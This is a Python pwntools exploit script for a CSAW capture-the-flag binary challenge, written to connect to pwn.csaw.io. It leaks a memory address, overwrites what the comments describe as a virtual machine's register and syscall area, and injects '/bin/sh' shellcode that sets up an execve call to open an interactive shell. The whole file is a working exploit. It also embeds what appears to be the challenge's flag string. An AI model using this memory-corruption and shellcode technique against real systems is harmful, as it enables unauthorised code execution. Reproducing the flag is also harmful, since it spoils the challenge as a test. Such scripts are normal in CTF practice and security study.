#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./prog")

context.binary = exe


def strace():
    r = process(["strace", exe.path])
    return r

def conn():
    r = process([exe.path])
    return r

def main():
    #r = conn()
    r = remote("pwn.csaw.io", 20001)
    #r = remote("localhost", 20001)
    
    r.recvuntil("[Debug] pool: ")
    addr = int(b"0x"+r.recvline().strip()[0:12], 16)
    log.info("mmap region 0x%x", addr)
    r.recv(4096) 
    #r.sendlineafter("Please enter the password>\n", b"csawctf{15_7h15_53cur3_by_d3516n?}" + cyclic_metasploit(0x56) + p64(0x4141414141414141) + cyclic_metasploit(10000 - 0x56 - 8))
    # providing libc .rodata as the pointer gave a bit of rip tampering
    # so until now i think the vm stores registers in the mmaped area
    # and we can corrupt that
    # r12 is a pointer to the arguments passed to syscall
    # I think r13 having 0x100000000000 it means we need to want a syscall
    # it will jump by 0x20 executing each syscall (program call not kernel syscall)
    

    """
    One idea is to reproduce the insns to invoke read syscall but with a larger size
    insns range 0x007ffff7fa8180 - 0x007ffff7fa8220 (included)
    """
    """
    0x80485b2                  mov    rax, QWORD PTR [r12+0x8]
 â†’  0x80485b7                  mov    rdi, QWORD PTR [r12+0x30]
    0x80485bc                  mov    rsi, QWORD PTR [r12+0x28]
    0x80485c1                  mov    rdx, QWORD PTR [r12+0x20]

    """
    payload  = b"csawctf{15_7h15_53cur3_by_d3516n?}"
    payload += b"A" * (0x50)
    payload += p64(0x0804)[0:6:]
    payload += p64(addr + 0x7000)
    #payload += p64(0x7ffff7fa80c0)
    # reproduce
    # 0x0000010000000000 seems like a jump to offset
    # read trace
    # 0x007ffff7fa8180 -> 0x007ffff7fa8680 - 0x007ffff7fa8740 -> 0x007ffff7fa81a0
    #payload += p64(0x0100000000000000) + p64(0x0000000000000001)
    #payload += p64(0x0000000000000000) + p64(0x0000000000000000)
    #payload += p64(0x0100000000000000) + p64(0x0000000000000001)
    #payload += p64(0x0000000000000000) + p64(0x0000000000000000)
    #payload += p64(0x0100000000000000) + p64(0x0000000000000001)
    #payload += p64(0x0000000000000000) + p64(0x0000000000000000)
    #payload += p64(0x0100000000000000) + p64(0x0000000000000001)
    #payload += p64(0x0000000000000000) + p64(0x0000000000000000)
    #payload += p64(0x0000000000010000) + p64(0x0000000000000003)
    #payload += p64(0x0000000000000010) + p64(0x0000000000000000)
    #payload += p64(0x0000000000000300) + p64(0x0000000000000003)
    #payload += p64(0x0000000000000070) + p64(0x0000000000000070)
    payload += p64(0x0000000000001000) + p64(0x0000000000000001)
    payload += p64(0x0000000000000001) + p64(0x0000000000000000)
    payload += p64(0x0000000000001000) + p64(0x0000000000000006)
    payload += p64(0x0000000000000006) + p64(0x0000000000000000)
    payload += p64(0x0000000000010000) + p64(0x0000000000000005)
    payload += p64(0x0000000000000005) + p64(0x0000000000000000)
    payload += p64(0x0000000000030000) + p64(0x0000000000000004)
    payload += p64(0x0000000000006e00) + p64(0x0000000000006e00)
    payload += p64(0x0000100000000000) + p64(0x0000000000000000)
    payload += p64(0x0000000000000000) + p64(0x0000000000000000)
    data = cyclic_metasploit(0x300 - len(payload) - 1)

    payload += data
    r.sendline(payload)
    r.recv(4096)
    pause()
    shellcode = shellcraft.sh()
    libc_base = addr - 0x5fa000

    payload += p8(0x90)*8 + b"/bin/sh\x00"
    payload += asm(shellcode)
    payload += p8(0)*(0x1fe8 - len(payload) + 0x20)
    #payload += p64(addr + 0x726f)
    payload += p64(0x080485b2) # r15 080485b2 set regs and syscall
    payload += p64(0)*2
    payload += p64(addr + 0x8fc0 - 8)
    payload += p8(0)*(0x2028 - len(payload))
    payload += p64(addr + 0x8fa8) # rsp
    payload += p64(0)*3
    payload += p64(addr + 0x8fb0) #rdi
    payload += p64(0)
    payload += p64(addr + 0x7267)
    payload += p64(0x3b) # rax
    payload += p64(addr + 0x7267) # rdi
    payload += p64(0)*0x3
    payload += p64(addr + 0x7267) #rdi
    payload += p64(0) #rsi
    payload += p64(0x0) #rdx

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
